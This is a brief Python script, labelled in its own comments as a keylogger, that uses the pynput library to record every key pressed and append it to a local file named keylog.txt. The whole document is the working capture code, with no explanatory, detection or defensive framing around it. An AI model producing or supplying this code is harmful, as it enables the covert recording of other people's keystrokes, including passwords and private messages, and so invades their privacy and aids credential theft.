from pynput.keyboard import Key, Listener

# Function to write the key to a file
def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key))

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
